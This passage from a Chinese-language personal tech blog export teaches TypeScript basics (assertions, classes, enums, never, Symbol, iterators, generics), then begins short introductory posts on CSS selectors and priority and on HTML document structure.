&lt;类型&gt;值 &lt;string&gt;value // 类型断言 let fun = (amount: number | string): void =&gt; { console.log((amount as string).length) } fun(\"10元\") fun(10) interface F1 { run: string } interface F2 { build: string } let fun2 = (F: F1 | F2): void =&gt; { console.log((&lt;F2&gt;F).build) } fun2({build: \"bui\"}) fun2({run: \"bui\"}) 使用 any 临时断言 //这样写会报错因为 window 对象没有abc这个东西 window.abc = 123 //可以使用any临时断言在 any 类型的变量上，访问任何属性都是允许的。 (window as any).abc = 123 断言型断言是不具影响力的 在下面的例子中，将 something 断言为 boolean 虽然可以通过编译，但是并没有什么用 并不会影响结果, 因为编译过程中会删除类型断言 function toBoolean(something: any): boolean { return something as boolean; } // 返回值为 1 并不会因为方法中进行了断言 或者定义了返回值类型这里就变成了布尔值 toBoolean(1); 内置对象ECMAScript 内置对象 Boolean、Number、String、RegExp、Date、Error let b: Boolean = new Boolean(1) console.log(b) let n: Number = new Number(true) console.log(n) let s: String = new String('哔哩哔哩XXXX') console.log(s) let d: Date = new Date() console.log(d) let r: RegExp = /^1/ console.log(r) let e: Error = new Error(\"error!\") console.log(e) DOM 内置对象 **Document、HTMLElement、NodeList ** let body: HTMLElement = document.body; let allDiv: NodeList = document.querySelectorAll('div'); //读取div 这种需要类型断言 或者加个判断应为读不到返回null let div: HTMLElement = document.querySelector('div') as HTMLDivElement document.addEventListener('click', function (e: MouseEvent) { }); BOM 内置对象 Event //dom元素的映射表 interface HTMLElementTagNameMap { \"a\": HTMLAnchorElement; \"abbr\": HTMLElement; \"address\": HTMLElement; \"applet\": HTMLAppletElement; \"area\": HTMLAreaElement; \"article\": HTMLElement; \"aside\": HTMLElement; \"audio\": HTMLAudioElement; \"b\": HTMLElement; \"base\": HTMLBaseElement; \"bdi\": HTMLElement; \"bdo\": HTMLElement; \"blockquote\": HTMLQuoteElement; \"body\": HTMLBodyElement; \"br\": HTMLBRElement; \"button\": HTMLButtonElement; \"canvas\": HTMLCanvasElement; \"caption\": HTMLTableCaptionElement; \"cite\": HTMLElement; \"code\": HTMLElement; \"col\": HTMLTableColElement; \"colgroup\": HTMLTableColElement; \"data\": HTMLDataElement; \"datalist\": HTMLDataListElement; \"dd\": HTMLElement; \"del\": HTMLModElement; \"details\": HTMLDetailsElement; \"dfn\": HTMLElement; \"dialog\": HTMLDialogElement; \"dir\": HTMLDirectoryElement; \"div\": HTMLDivElement; \"dl\": HTMLDListElement; \"dt\": HTMLElement; \"em\": HTMLElement; \"embed\": HTMLEmbedElement; \"fieldset\": HTMLFieldSetElement; \"figcaption\": HTMLElement; \"figure\": HTMLElement; \"font\": HTMLFontElement; \"footer\": HTMLElement; \"form\": HTMLFormElement; \"frame\": HTMLFrameElement; \"frameset\": HTMLFrameSetElement; \"h1\": HTMLHeadingElement; \"h2\": HTMLHeadingElement; \"h3\": HTMLHeadingElement; \"h4\": HTMLHeadingElement; \"h5\": HTMLHeadingElement; \"h6\": HTMLHeadingElement; \"head\": HTMLHeadElement; \"header\": HTMLElement; \"hgroup\": HTMLElement; \"hr\": HTMLHRElement; \"html\": HTMLHtmlElement; \"i\": HTMLElement; \"iframe\": HTMLIFrameElement; \"img\": HTMLImageElement; \"input\": HTMLInputElement; \"ins\": HTMLModElement; \"kbd\": HTMLElement; \"label\": HTMLLabelElement; \"legend\": HTMLLegendElement; \"li\": HTMLLIElement; \"link\": HTMLLinkElement; \"main\": HTMLElement; \"map\": HTMLMapElement; \"mark\": HTMLElement; \"marquee\": HTMLMarqueeElement; \"menu\": HTMLMenuElement; \"meta\": HTMLMetaElement; \"meter\": HTMLMeterElement; \"nav\": HTMLElement; \"noscript\": HTMLElement; \"object\": HTMLObjectElement; \"ol\": HTMLOListElement; \"optgroup\": HTMLOptGroupElement; \"option\": HTMLOptionElement; \"output\": HTMLOutputElement; \"p\": HTMLParagraphElement; \"param\": HTMLParamElement; \"picture\": HTMLPictureElement; \"pre\": HTMLPreElement; \"progress\": HTMLProgressElement; \"q\": HTMLQuoteElement; \"rp\": HTMLElement; \"rt\": HTMLElement; \"ruby\": HTMLElement; \"s\": HTMLElement; \"samp\": HTMLElement; \"script\": HTMLScriptElement; \"section\": HTMLElement; \"select\": HTMLSelectElement; \"slot\": HTMLSlotElement; \"small\": HTMLElement; \"source\": HTMLSourceElement; \"span\": HTMLSpanElement; \"strong\": HTMLElement; \"style\": HTMLStyleElement; \"sub\": HTMLElement; \"summary\": HTMLElement; \"sup\": HTMLElement; \"table\": HTMLTableElement; \"tbody\": HTMLTableSectionElement; \"td\": HTMLTableDataCellElement; \"template\": HTMLTemplateElement; \"textarea\": HTMLTextAreaElement; \"tfoot\": HTMLTableSectionElement; \"th\": HTMLTableHeaderCellElement; \"thead\": HTMLTableSectionElement; \"time\": HTMLTimeElement; \"title\": HTMLTitleElement; \"tr\": HTMLTableRowElement; \"track\": HTMLTrackElement; \"u\": HTMLElement; \"ul\": HTMLUListElement; \"var\": HTMLElement; \"video\": HTMLVideoElement; \"wbr\": HTMLElement; } Promise 定义 Promise 时,如果我们不指定返回的类型TS是推断不出来返回的是什么类型 // 函数和 new 对象的时候都需要指定泛型 这个 Promise 才知道要返回什么类型 function promise(): Promise&lt;number&gt; { return new Promise&lt;number&gt;((resolve, reject) =&gt; { resolve(1) }) } promise().then(res =&gt; { console.log(res) }) Class类的基本声明 在TypeScript是不允许直接在constructor 定义变量的 需要在constructor上面先声明 如果了定义了属性但是构造函数不进行初始化 也会报错 通常是给个默认值（在定义属性的时候给个默认值） 或者 进行赋值 class Person { //定义三个属性 和一个带有默认值的属性(如果gender 不进行默认值赋值,就需要在构造器中初始化,不然会报错) name: string age: number amount: number | string gender: string = \"未知\" //constructor 构造器 constructor(name: string, age: number, amount: number | string) { this.name = name; this.age = age; this.amount = amount; } } let ada = new Person(\"ada\", 18, \"10元\"); let ada2 = new Person(\"阿达\", 20, 100); console.log(ada, ada2) 修饰符 TS 中类属性有三个权限修饰符 public private protected 属性显示声明的情况下默认就是 public public 没有限制作用域，类外也能访问 private 只能在类的内部访问 protected 内部和子类中能访问 class Person { //姓名大家都可以知道公开的,年龄的话属于一点点隐私只有比较熟的人能访问,个人余额是保密的只有自己能访问 public name: string protected age: number private amount: number | string gender: string = \"未知\" //constructor 构造器 constructor(name: string, age: number, amount: number | string) { this.name = name; this.age = age; this.amount = amount; } } let ada = new Person(\"ada\", 18, \"10元\"); // 外部只能访问 public 属性(gender 未显示声明，默认为 public) console.log(ada.name, ada.gender) class Man extends Person { constructor(name: string, age: number, amount: number | string) { super(name, age, amount); // amount 属性子类中也不能访问 console.log(this.age, this.name, this.gender); } } new Man(\"TypeScript\", 5, 300) static 修饰符 静态方法只能访问静态属性(和 java 差不多) 类中的静态函数之间可以用 this 相互调用 非静态函数中如果要调用静态函数需要用 类名.静态函数名 外部调用静态函数也是用 类名.静态函数名 不需要再单独 New 对象了 static 属性在构造器中也只能用 类名.静态属性名 // 静态属性 静态函数 class Person { public name: string protected age: number = 23 private static amount: number | string = 0 //constructor 构造器 constructor(name: string, age: number) { this.name = name; this.age = age; console.log(\"初始化对象\") //非静态函数中如果要调用静态函数需要用 类名.静态函数名 console.log(Person.getPerson()); } // 静态函数中只能访问静态属性 static getAmount() { return this.amount } static getPerson() { //静态函数调用另外一个静态函数,直接用 this return this.getAmount() } } //外部调用静态函数也是用 类名.静态函数名 不需要再单独 New 对象了 console.log(Person.getAmount()); new Person(\"ada\", 20) interface interface 定义类 使用关键字 implements 后面跟interface的名字多个用逗号隔开 继承还是用extends interface Person { get(number: number): string } interface Man { say(): string } class Woman { eat(): boolean { return true } } //继承 Woman 并且实现 Person, Man 两个接口 class User extends Woman implements Person, Man { get(number: number): string { if (number === 1) { return \"---子类实现接口未显示的方法\"; } else { return \"+++子类实现接口未显示的方法\"; } }; say(): string { return \"Hello, world!\"; } } // 创建对象后调用实现的方法和继承方法 let user = new User; console.log(user.get(5)); console.log(user.say()); console.log(user.eat()); abstract 应用场景如果你写的类实例化之后毫无用处此时我可以把他定义为抽象类 或者你也可以把他作为一个基类-&gt; 通过继承一个派生类去实现基类的一些方法 抽象类中可以有普通函数和抽象函数 普通函数可以实现具体方法,派生类不需要实现该方法 抽象函数不能实现具体业务,派生类必须要实现该方法 // 抽象类中可以有普通函数和抽象函数 abstract class Abs { name: string protected constructor(name: string) { this.name = name; } // 普通函数可以实现具体方法,派生类不需要实现该方法 setName(name: string): void { this.name = name } // 抽象函数不能实现具体业务,派生类必须要实现该方法 abstract getName(): string } class PersonAbs extends Abs { constructor() { super(\"ada\"); } getName(): string { return this.name; } } let p = new PersonAbs() console.log(p.getName()); p.setName(\"setName\") console.log(p.getName()); 元组Tuple 元组就是数组的变种 元组 Tuple 是固定数量的不同类型的元素的组合(但是也可以越界 push) 元组与集合的不同之处在于，元组中的元素类型可以是不同的，而且数量固定。元组的好处在于可以把多个元素作为一个单元传递。如果一个方法需要返回多个值，可以把这多个值作为元组返回，而不需要创建额外的类来表示。 // 元组 赋值的类型和长度需要和定义时一致 let arrTuple: [string, number] = [\"1\", 1] let arrTuple2: [string, number, boolean] = [\"1\", 1, false] console.log(arrTuple[0].length); // arrTuple[1] 自动推断出来是数字类型所以没有 length 属性 // console.log(arrTuple[1].length); console.log(arrTuple) // 越界元组(上面显示声明的时候 arrTuple 长度只有 2)，但是这里可以 越界 push 类型约束为联合类型 arrTuple.push(2, 'ada') console.log(arrTuple) // 实际应用场景比如 excel 对象 let excel: [string, string, number, string][] = [ ['title1', 'name1', 1, '123'], ['title2', 'name2', 2, '123'], ['title3', 'name3', 3, '123'], ['title4', 'name4', 4, '123'], ['title5', 'name5', 5, '123'], ] enum 在 JavaScript 中是没有枚举的概念的 TS 帮我们定义了枚举这个类型 数字枚举// 数字枚举 只需要定义属性名，会自动给你排序下标 enum Color { RED, GREEN, BLUE, } console.log(Color.RED, Color.GREEN, Color.BLUE) //增长枚举,给第一个枚举对象定义下标，后面的会自动增长 enum Color2 { RED = 3, GREEN, BLUE, } console.log(Color2.RED, Color2.GREEN, Color2.BLUE) //自定义枚举,没有自定义的会根据前面一个的值自动增长 enum Color3 { RED = 1, GREEN = 5, BLUE, } console.log(Color3.RED, Color3.GREEN, Color3.BLUE) 字符串枚举 字符串枚举的概念很简单。 在一个字符串枚举里，每个成员都必须用字符串字面量，或另外一个字符串枚举成员进行初始化。 由于字符串枚举没有自增长的行为，字符串枚举可以很好的序列化。 换句话说，如果你正在调试并且必须要读一个数字枚举的运行时的值，这个值通常是很难读的 - 它并不能表达有用的信息，字符串枚举允许你提供一个运行时有意义的并且可读的值，独立于枚举成员的名字 下面的 Color1 其实算是一个异构枚举(这里只是为了对比) // 字符串枚举 没有自增的说法定义了一个,后面的都要定义() enum Color { RED = \"red\", GREEN = \"green\", BLUE = \"blue\", } console.log(Color.RED, Color.GREEN, Color.BLUE) // 字符串枚举,第一个不定义字符串默认为 0,第二个定义了字符串后面的都要定义字符串 enum Color1 { RED, GREEN = \"green\", BLUE = \"blue\", } console.log(Color1.RED, Color1.GREEN, Color1.BLUE) 异构枚举 将枚举的类型进行混合为字符串和数字类型 // 异构枚举 不到万不得不用这种 enum bool { YES = 'true', NO = 0, UNKNOWN } // unknown 在 no 下,因为 no 定义了 0 ,name unknown 会自增 console.log(bool.YES, bool.NO, bool.UNKNOWN) 接口枚举enum Color { RED = 1, GREEN, BLUE, } // 接口属性的值为枚举属性 interface Col { red: Color.RED } // 要实现接口中的属性,值的类型必须要和枚举中值的类型相同,因为枚举中声明了 RED = 1 ,那么这里赋值的时候必须是 number 型 let C: Col = { red: 4 } let C2: Col = { red: Color.RED } console.log(C.red) console.log(C2.red) const枚举 什么枚举 let 和 var 都是不允许的声明只能使用const 或者不用 大多数情况下，枚举是十分有效的方案。 然而在某些情况下需求很严格。 为了避免在额外生成的代码上的开销和额外的非直接的对枚举成员的访问，我们可以使用 const枚举。 常量枚举通过在枚举上使用 const修饰符来定义 const 声明的枚举会被编译成常量,普通声明的枚举编译完后是个对象 const enum bool { YES = 'true', NO = 0, } if (bool.NO === 0) { } //-----------对比---------------- enum bool2 { YES = 'true', NO = 0, } if (bool2.NO === 0) { } 反向映射 它包含了正向映射（ name -&gt; value）和反向映射（ value -&gt; name） 要注意的是 不会为字符串枚举成员生成反向映射 // 反向映射 enum Type { SUCCESS = 'true', FAIL = 0 } let SUCCESS = Type.SUCCESS let failureValue = Type.FAIL console.log(SUCCESS, failureValue) // 这里能取 FAIL 的 key ,SUCCESS 是字符串不能取到 Key let failKeys = Type[failureValue] console.log(failKeys) 类型推论&amp;类型别名 什么是类型推论？—&gt; 我声明了一个变量，在没有约束类型的情况对其进行了赋值,那么 TS 就会根据赋值的类型推断出实际的类型 如果你声明变量没有定义类型也没有赋值这时候 TS 会推断成 any 类型可以进行任何操作 // 类型推论 没有约束类型 a:string b:number let a = 'str' let b = 123 // 声明时没有定义值,这个时候就是 any 类型 let an an = \"123\" an = 123 an = false an = [1, \"22\", false] console.log(a, b, an) // 类型别名 s 等同与 string 类型 type s = string let username: s = \"ada\" // 类型别名 联合类型 type snb = string | number | boolean let amount: snb = 0 amount = \"0元\" amount = false console.log(username, amount) // 函数式类型别名,str 类型的函数必须返回 string type str = () =&gt; string const getName: str = () =&gt; \"ada函数式别名\" console.log(getName()); // 字面量类型别名 变量 s 的赋值 只能是 status 类型值中的 on 或者 off false 三个中的一个 type status = \"on\" | \"off\" | false let s: status = \"on\" console.log(s) never 类型 TypeScript 将使用 never 类型来表示不应该存在的状态 never 与 void 差异: ① void 类型只是没有返回值但本身不会出错 ② never 只会抛出异常没有返回值 // never 类型 这里约束的是一个交叉类型 实际上是一个不可能的类型,所以被推断出了 never 类型 let never1: string &amp; number // 返回never的函数必须存在无法达到的终点 // 因为必定抛出异常，所以 error 将不会有返回值 function error(message: string): never { throw new Error(message); } // 因为存在死循环，所以 loop 将不会有返回值 function loop(): never { while (true) { } } never 类型的一个应用场景：现在有 Working Happy 两个接口,产品加了一个新需求，刚好老同事离职了,让新同事加个 Money 接口,我们必须手动找到所有 switch 代码并处理，否则将有可能引入 BUG ,而且这将是一个“隐蔽型”的BUG，如果回归面不够广，很难发现此类BUG,那 TS 有没有办法帮助我们在类型检查阶段发现这个问题呢?当然是有的,由于任何类型都不能赋值给 never 类型的变量，所以当存在进入 default 分支的可能性时，TS的类型检查会及时帮我们发现这个问题 interface Working { today: \"工作日\" } interface Happy { today: \"休息日\" } // 1.产品新加一个需求,新同时把这个 interface 加上了 interface Money { today: \"今天 10 号发工资\" } // 2.类型别名也加上了 type days = Working | Happy | Money function f(day: days) { switch (day.today) { // 3.这个 case 的代码他不清楚就没加 case \"工作日\": console.log(\"搬砖\") break case \"休息日\": console.log(\"看电影\") break // 兜底逻辑 default: // 4.这里编译就会报错，这样就能防止出现其它意外,这就是 never 的一个经典场景 const check: never = day break } } Symbol Symbol 是ES6 新增的一个类型,意寓着象征的意思 symbol类型的值是通过Symbol构造函数创建的。 可以传递参做为唯一标识 只支持 string 和 number类型的参数,其它类型的值会被 toString 基础使用let str = Symbol('字符串') let num = Symbol(123) console.log(str, num) let obj = { [str]: \"stri\", [num]: 18, name: \"ada\", arg: \"25\" } //for in 遍历的时候 不会输出 Symbol 类型的 key for (let key in obj) { console.log(key) } // Object.keys Object.getOwnPropertyNames 遍历的时候 不会输出 Symbol 类型的 key console.log(Object.keys(obj)) console.log(Object.getOwnPropertyNames(obj)) // 转成 JSON Symbol 类型的 不会被转进去 console.log(JSON.stringify(obj)); // Object.getOwnPropertySymbols 或者 Symbol 类型的属性 console.log(Object.getOwnPropertySymbols(obj)) // 获取所有的属性 console.log(Reflect.ownKeys(obj)) Iterator迭代器 迭代器不支持对象(对象没有Symbol.iterator() 方法) Map Set Array 这些都支持 // Iterator // 定义一个 number 类型的数组 let arr: Array&lt;number&gt; = [1, 3, 5] // 通过 Symbol.iterator 的方式迭代 arr 返回的类型是 Iterator&lt;number&gt; ,泛型指定为 arr 的泛型 let numbers: Iterator&lt;number&gt; = arr[Symbol.iterator](); // next 方法有会返回一个对象，包含两个属性一个是 value 表示迭代出来的值,另外一个是 done 表示是否结束迭代( [true/false]) console.log(numbers.next()); console.log(numbers.next()); console.log(numbers.next()); // 其实只能迭代三次第四次的 value= undefined done=true (表示没有了) console.log(numbers.next()); // 迭代器示例done 的属性值取反 let arr2: Array&lt;number&gt; = [1, 3, 5] let set: Set&lt;string&gt; = new Set&lt;string&gt;([\"我\", \"是\", \"ada\"]); let map: Map&lt;string, any&gt; = new Map&lt;string, any&gt;() map.set(\"name\", \"ada\") map.set(\"age\", 20) let iterator = (args: any): void =&gt; { let it: Iterator&lt;any&gt; = args[Symbol.iterator]() let next: any = {done: false} while (!next.done) { next = it.next() if (!next.done) { console.log(next.value); } } } iterator(arr2) iterator(set) iterator(map) for of for of 就像是 iterator 迭代器的语法糖,底层会自动调用Symbol.iterator() 方法帮我们进行迭代 同样也不支持对象 与 for in 的区别： for in 主要针对与 Array 迭代出来的是索引,for of 支持遍历大部分类型迭代器 arr nodeList argumetns set map 等,迭代出来的是 value ps:截图中我的 let item of items 编辑器在报错，但是也能正常运行不知道咋回事 // for of 生成器 let arr: Array&lt;number&gt; = [1, 3, 5] let set: Set&lt;string&gt; = new Set&lt;string&gt;([\"我\", \"是\", \"ada\"]); let map: Map&lt;string, any&gt; = new Map() map.set(\"name\", \"ada\") map.set(\"age\", 20) type asm = Array&lt;number&gt; | Set&lt;string&gt; | Map&lt;string, any&gt; let forOf = (items: asm): void =&gt; { for (let item of items) { console.log(item) } console.log(\"------------------------\") } forOf(arr) forOf(set) forOf(map) 其它函数 Symbol.hasInstance 方法，会被instanceof运算符调用。构造器对象用来识别一个对象是否是其实例。 Symbol.isConcatSpreadable布尔值，表示当在一个对象上调用Array.prototype.concat时，这个对象的数组元素是否可展开。 Symbol.iterator 方法，被for-of语句调用。返回对象的默认迭代器。 Symbol.match 方法，被String.prototype.match调用。正则表达式用来匹配字符串。 Symbol.replace 方法，被String.prototype.replace调用。正则表达式用来替换字符串中匹配的子串。 Symbol.search 方法，被String.prototype.search调用。正则表达式返回被匹配部分在字符串中的索引。 Symbol.species 函数值，为一个构造函数。用来创建派生对象。 Symbol.split 方法，被String.prototype.split调用。正则表达式来用分割字符串。 Symbol.toPrimitive 方法，被ToPrimitive抽象操作调用。把对象转换为相应的原始值。 Symbol.toStringTag 方法，被内置方法Object.prototype.toString调用。返回创建对象时默认的字符串描述。 Symbol.unscopables 对象，它自己拥有的属性会被with作用域排除在外。 泛型 泛型在 TS 中是很重要的东西,例如 VUE3 是用 TS 编写的,里面用得到了非常多的泛型 泛型函数 在我们的场景中会有很多功能一样的函数，但是需要的参数类型却是各不相同,如下两端代码,功能一致,但是对传参类型一个是 number,另外一个是 string function num(a: number, b: number): Array&lt;number&gt; { return [a, b]; } num(15, 20) function str(a: string, b: string): Array&lt;string&gt; { return [a, b]; } str(\"好好学\", \"上网\") 泛型函数语法为函数名字后面跟一个&lt;参数名&gt; 参数名可以随便写 例如我这儿写了 T 当我们使用这个函数的时候把参数的类型传进去就可以了（也就是动态类型） 我们也可以使用不同的泛型参数名，只要在数量上和使用方式上能对应上就可以 function returnInput&lt;T&gt;(a: T, b: T): Array&lt;T&gt; { return [a, b] } // 调用泛型函数时可做泛型类型约束,如 returnInput&lt;number&gt;(15, 20) ,或不约束 returnInput(15, 20) 会自动触发类型推论 console.log(returnInput&lt;number&gt;(15, 20)); console.log(returnInput(15, 20)); console.log(returnInput(\"好好学\", \"上网\")); // 多个类型 function returnInput2&lt;N, S&gt;(a: N, b: S): Array&lt;N | S&gt; { return [a, b] } console.log(returnInput2(5, \"幼儿园\")); 泛型约束 上面我们已经实现了泛型化了，但是这种泛型太任意了,可能会导致传递的参数类型与我们预期的不一致,因此我们可以对泛型进行一定的约束 使用 extends 关键字 interface len { length: number } // 定义了一个泛型方法,要求传递的参数必须要有 length 属性，且属性值是 number 类型 function f&lt;T extends len&gt;(a: T): number { return a.length } // 调用 f 方法是要求传递的参数必须要有 length 属性，如果传如的是 boolean number 是没有 length 属性的 console.log(f(\"123\")); console.log(f([1, 2, 4, \"China\"])); console.log(f({length: 10, age: 19})); keyof 其中使用了TS泛型和泛型约束。首先定义了T类型并使用extends关键字继承object类型的子类型，然后使用keyof操作符获取T类型的所有键，它的返回 类型是联合 类型，最后利用extends关键字约束 K类型必须为keyof T联合类型的子类型 // K extends keyof O ---&gt; K 类型为 O 类型的所有 KEY 的集合 function prop&lt;O, K extends keyof O&gt;(obj: O, key: K) { // 根据 key值, 获取 obj 该 key 对应的 value return obj[key]; } enum Gender { WOMAN = 0, MAN = 1, OTHER = 2 } let user = { name: \"阿达\", age: 18, grand: Gender.MAN } // 传递的第一个参数是任意类型，但是第二个参数必须要是第一个参数的属性中的 任意一个 key console.log(prop(user, \"name\")); console.log(prop(user, \"age\")); console.log(prop(\"abc\", \"length\")); 泛型类 声明方法跟函数类似名称后面定义&lt;类型&gt; 使用的时候确定类型new Sub&lt;类型&gt;() class Clazz&lt;S, N&gt; { str: S num: N constructor(str: S, num: N) { this.str = str this.num = num } arr(a: S, b: N): Array&lt;S | N&gt; { return [a, b] } getStr(a: S): S { return a } getNum(b: N, c: N): N[] { return [b, c] } } // 先约束一下类型 let cla = new Clazz&lt;string, number&gt;(\"string\", 0) cla.str = \"string 类型\" cla.num = 10 console.log(cla.arr(\"1\", 2)); console.log(cla.getStr(\"参数只能传 S 类型的\")); console.log(cla.getNum(1, 2));","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"TS","slug":"TS","permalink":"https://www.adalucky.com/tags/TS/"}],"author":"Ada"},{"title":"CSS","slug":"Auto/CSS","date":"2022-05-18T04:13:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/css/","link":"","permalink":"https://www.adalucky.com/auto/css/","excerpt":"CSS3是CSS（层叠样式表）技术的升级版本，于1999年开始制订，2001年5月23日W3C完成了CSS3的工作草案，主要包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块","text":"CSS3是CSS（层叠样式表）技术的升级版本，于1999年开始制订，2001年5月23日W3C完成了CSS3的工作草案，主要包括盒子模型、列表模块、超链接方式、语言模块、背景和边框、文字特效、多栏布局等模块 参考资料 CSS简介 css 也叫样式层叠表，是一个控制与显示 html 元素的声明式语言，从而达到控制网页的显示效果 html 和 css 就是一对组合 选择器：选择器是 用于选择 html 元素用的，即表示这个样式对 哪个 html 元素有效 CSS 语法结构h1 { width: 600px; height: 1200px; margin: auto; } CSS 样式类型 CSS 样式类型包括三种：内联样式、内部样式、外部样式 内联样式 内联样式(Inline Style),也叫内嵌样式 内联样式是直接写在 html 元素上的，没有选择器，直接使用 style 属性声明,该样式仅仅对当前的元素有效 内部样式 内部样式表(Internal Style. Sheet) 内部样式是写在 HTML 文件的 &lt;head&gt; 标签中的 &lt;style&gt; 标签中 &lt;style&gt; 标签中 可以有一个或者多个样式规则 &lt;style&gt; 标签中 的样式只对当前页面有效 外部样式 外部样式表(External Style. Sheet) 外部样式通过 link 标签下的 href 属性指定外部样式文件的路径，这样就可以引入外部样式表了 引入的外部样式也仅仅是对当前页面有效 外部样式可以被多个文件引用 示例内联样式示例 因为内联样式是直接写到元素上的，因此只对当前元素有效 内部样式示例 内部样式是写在 HTML 文件的 &lt;head&gt; 标签中的 &lt;style&gt; 标签中 内部样式需要选择器选择某个标签对其生效 外部样式示例 创建外部样式表 通过 link 引入外部样式表 选择器简介 选择器：选择器 Selector 是用于选择 html 元素用的，即表示这个样式对 哪个 html 元素有效 常见的选择器有：类型选择器 样式选择器 id选择器 属性选择器 类型选择器 类型选择器直接写 HTML 标签的名称 类型选择器的作用是 选择页面上所有该类型的元素 如下所示 h1 h2 就是类型选择器，会对该页面所有的 h1 h2 标签的元素生效 h1 { color: red; } h2 { color: green; } 类选择器 类选择器通过 .className{} 进行定义 CSS 规则后，在元素中通过 class 属性指定类名 如下所示的 p标签 id选择器 id选择器以 # 号开头加上样式名称例如 #otherText{} 在元素上通过 id 属性指定 样式名称进行选择 属性选择器 属性选择器在实际中并不是很常用 它的规则就是元素中包含了某个属性时 语法：标签名[属性名]，例如 a[title] a标签有 title 属性的元素 a[title=\"baidu\"] a标签且 title 属性等于 baidu 的元素 **a[title=\"\"] a标签且 title 属性为空的元素 ** 属性值是区分大小写的 例如在元素中叫做 Welcome 那么我们 CSS 规则中的属性值匹配也需要用大写 通用选择器 通用选择器是对所有元素进行选择，也就我么的 *{} 一般用来设置全局的样式、字体等 如下所示进行了一个全局 Mac 系统下的全局的字体设置 * { font-family: \"Pingfang SC\" } 组合选择器 组合选择器，指的是进行多个条件的组合定位到某一元素例如 h1.text{} 表示 h1 标签下并且 class=”text” 的元素 类型选择器+类选择器 例如 h1.text{} 表示 h1 标签下并且 class=”text” 的元素 h1.text{ color: red; } 例如h1.text, h1.other {color: red;} 表示 h1 标签下 class=\"text\"或者 class=\"other\" 的元素 h1.text, h1.other { color: red; } 多个类型选择器 例如 h1,p{color: green;} 选择所有的 h1 和 p 标签 下面的截图示例中 h1.text 它也是一个 h1标签 但是颜色没有和其它的一样，这个要涉及到优先级，后面章节会介绍 h1,p{ color: green; } 父子选择器 父子选择器两个元素之间用空格隔开表示下一级 例如div h1,p a{color:red;} 表示选择 div标签下的 h1 标签元素，和 P 标签下的 a标签元素 div h1,p a{ color:red; } CSS 优先级相同规则先后顺序 相同的规则按照加载顺序，写在后面的优先级更高 如图所示，对 h1 标签定义了两个相同的规则，写在后面的会覆盖掉前面的，因此顺序在后面的优先级更高 内部样式与比外部样式 在一个 html 文件中 通过 link 引入了外部样式，并且在 style 中也定义了相同规则的内部样式，先后顺序由所在的 link 标签和 style 标签顺序决定，同样是后面的优先级更高 如下图所示：style 标签位于 link 标签下方因此 style 标签中定义的类型选择器 h1 会覆盖掉外部样式中定义的 h1 标签的样式 总结：内部样式和外部样式没有优先级，还是通过加载顺序控制 继承样式与指定样式 继承下来的样式优先级永远低于直接指定的样式 当我们的 html 中有一个全局的样式配置后，又对其中具体的某个标签进行指定，那么指定的样式优先级高于继承与全局样式的优先级 内联样式与!important 内联样式优先级最高, !important 是个意外 在元素中通过内联样式指定的优先级是最高的，但是如果外部样式或者内部样式 用了!important 声明，那么就会把这个指的 !important 当成一个例外 如下图所示，内联样式虽然优先级最近，但是 !important 是个意外 选择器之间的优先级 ID选择器 (ID Selector) &gt; 类选择器 (Class Selector) &gt; 类型选择器 (Type Selector) 与先后顺序无关 优先级总结 相同的规则按照加载顺序,写在后面的优先级更高 内部样式和外部样式没有优先级,还是通过加载顺序控制,写在后面的优先级更高 继承下来的样式优先级永远低于直接指定的样式 内联样式优先级最高, !important 是个意外 ID选择器 (ID Selector) &gt; 类选择器 (Class Selector) &gt; 类型选择器 (Type Selector) 盒子模型","categories":[{"name":"Auto","slug":"Auto","permalink":"https://www.adalucky.com/categories/Auto/"}],"tags":[{"name":"css","slug":"css","permalink":"https://www.adalucky.com/tags/css/"}],"author":"Ada"},{"title":"HTML","slug":"Auto/HTML","date":"2022-05-12T04:13:00.000Z","updated":"2022-06-13T14:43:37.102Z","comments":true,"path":"/auto/html/","link":"","permalink":"https://www.adalucky.com/auto/html/","excerpt":"HTML5是构建Web内容的一种语言描述方式。HTML5是互联网的下一代标准，是构建以及呈现互联网内容的一种语言方式．被认为是互联网的核心技术之一。HTML产生于1990年，1997年HTML4成为互联网标准，并广泛应用于互联网应用的开发。","text":"HTML5是构建Web内容的一种语言描述方式。HTML5是互联网的下一代标准，是构建以及呈现互联网内容的一种语言方式．被认为是互联网的核心技术之一。HTML产生于1990年，1997年HTML4成为互联网标准，并广泛应用于互联网应用的开发。 参考资料 初识HTML简介 什么是HTML? –&gt; HTML是Hyper Text Markup Language的缩写,中文：超文本标记语言 HTML并不是一门编程语言 编程语言的关键是逻辑，例如有条件选择 if else HTML是用来构建网页元素的标记语言 文本段落、表格、图片 目前看到的所有网站，都是由 html 元素构成 编程语言例如们 javaScript 用来写页面逻辑、调用接口、操作&amp;连接数据库等 在做 WEB 开发时，HTML是最基础和最必须要了解的 只使用HTML就可以构建简单网页 HTML+CSS+JavaScript:组成了WEB开发的基石 把整个人当做成一个WEB HTML: 就是由各种元素组成的人的身体 body 手、脚、眼睛、耳朵 各种不同的标签 CSS: 决定人身体的外观和布局，眼睛张在哪里，单眼皮还是双眼，多高多重，还可以给人元素加上各种各样的样式美化，就像人一样穿上好看的衣服和化着美美的妆 JavaScript:决定行为、动作、让人动起来，不然再好看的 HTML+CSS 也是静态的死的 开发环境准备 html 的开发只需要一个 文本编辑器或 IDE 工具（用于写代码）外加一个浏览器用来查看效果 浏览器一般用 chrome ,文本编辑器看自己习惯吧，比如 sublime Text vsCode 或者其它的 IDE 工具 HTML 的好处是我们不需要使用其他的环境和服务，只需要创建一个以 .html 为后缀的文件，然后使用浏览器打开就可以了 首页 HTML 文件一般是 index.html ，如果你部署了一个 www.xxx.com 根域名默认显示 index.html 中的内容，当然也是可以自行配置的 结构 &lt;!DOCTYPE html&gt; 文档声明告诉浏览器我是一个 html 文件 &lt;html&gt;&lt;/html&gt; 该标签是 HTML 根元素 &lt;head&gt;&lt;/head&gt; HTML 头一般放入原数据，或者是搜索引擎的 keyword title 脚本 css文件链接 meta标签是一个辅助性的标签 &lt;body&gt;&lt;/body&gt; HTML body 体内放入 HTML 元素，我们页面上的内容也就是 body 体内的内容了 &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; 